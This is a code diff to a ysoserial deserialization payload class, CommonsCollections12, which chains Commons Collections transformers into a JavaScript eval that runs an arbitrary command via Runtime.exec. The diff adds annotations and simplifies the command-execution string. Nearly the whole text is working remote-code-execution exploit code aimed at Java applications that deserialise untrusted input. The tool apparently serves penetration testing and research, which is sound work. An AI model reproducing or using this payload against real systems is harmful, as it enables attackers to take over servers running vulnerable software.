@@ -6,6 +6,8 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -15,6 +17,9 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
+@SuppressWarnings({"rawtypes", "unchecked"})
+@Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({Authors.Y4ER})
 public class CommonsCollections12 extends PayloadRunner implements ObjectPayload<Object> {
     public static void main(String[] args) throws Exception {
         PayloadRunner.run(CommonsCollections12.class, args);
@@ -26,17 +31,7 @@ public class CommonsCollections12 extends PayloadRunner implements ObjectPayload
             new ConstantTransformer(ScriptEngineManager.class),
             new InvokerTransformer("newInstance", new Class[0], new Object[0]),
             new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}),
-            new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{
-                "var cmd = [];\n" +
-                "var command = '" + command + "';\n" +
-                "var osname = java.lang.System.getProperty('os.name');\n" +
-                "osname = osname.toLowerCase();\n" +
-                "if (osname.startsWith('win')) {\n" +
-                "    cmd = ['cmd.exe', '/c', command];\n" +
-                "} else {\n" +
-                "    cmd = ['bash', '-c', command];\n" +
-                "}\n" +
-                "java.lang.Runtime.getRuntime().exec(cmd)"}),
+            new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + command + "');"})
         };
 
         Transformer transformerChain = new ChainedTransformer(transformers);
